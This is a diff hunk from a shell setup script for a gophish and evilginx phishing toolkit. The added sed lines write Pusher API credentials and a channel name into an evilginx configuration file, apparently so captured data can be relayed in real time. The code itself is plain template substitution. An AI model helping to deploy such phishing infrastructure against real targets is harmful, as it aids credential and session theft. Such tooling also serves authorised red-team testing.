@@ -178,6 +178,12 @@ function setup_gophish () {
         sed "s|const APP_KEY = '';|const APP_KEY = '${key}';|g" conf/app.js.template > pusher/client/app.js
         sed -i "s|const APP_CLUSTER = '';|const APP_CLUSTER = '${cluster}';|g" pusher/client/app.js
         sed -i "s|const channel = pusher.subscribe('');|const channel = pusher.subscribe('${channel_name}');|g" pusher/client/app.js
+        sed "s|\"pusher_app_id\": \"\",|\"pusher_app_id\": \"${app_id}\",|g" conf/pusher.conf.template > "${evilginx_dir}/pusher.conf"
+        sed -i "s|\"pusher_app_key\": \"\",|\"pusher_app_key\": \"${key}\",|g" "${evilginx_dir}/pusher.conf"
+        sed -i "s|\"pusher_app_secret\": \"\",|\"pusher_app_secret\": \"${secret}\",|g" "${evilginx_dir}/pusher.conf"
+        sed -i "s|\"pusher_app_cluster\": \"\",|\"pusher_app_cluster\": \"${cluster}\",|g" "${evilginx_dir}/pusher.conf"
+        sed -i "s|\"pusher_encrypt_key\": \"\",|\"pusher_encrypt_key\": \"${encrypt_key}\",|g" "${evilginx_dir}/pusher.conf"
+        sed -i "s|\"pusher_channel_name\": \"\",|\"pusher_channel_name\": \"${channel_name}\",|g" "${evilginx_dir}/pusher.conf"
         cd pusher || exit 1
         go build
         cd ..
